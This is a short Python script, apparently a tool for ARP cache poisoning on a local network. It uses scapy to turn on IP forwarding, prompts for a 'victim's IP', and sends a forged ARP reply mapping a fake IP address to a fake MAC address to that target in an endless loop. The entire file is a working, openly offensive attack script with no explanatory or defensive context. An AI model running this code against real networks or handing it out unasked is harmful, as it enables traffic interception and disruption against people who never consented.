from scapy.all import *
import os

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

target_ip = input("Enter the victim's IP: ")
fake_ip = "10.13.33.37"
fake_mac = "de:ad:be:ef:ca:fe"

packet = ARP(op=2, psrc=fake_ip, hwsrc=fake_mac, pdst=target_ip)
print("Poisoning ongoing...")

while True:
    send(packet, verbose=0)
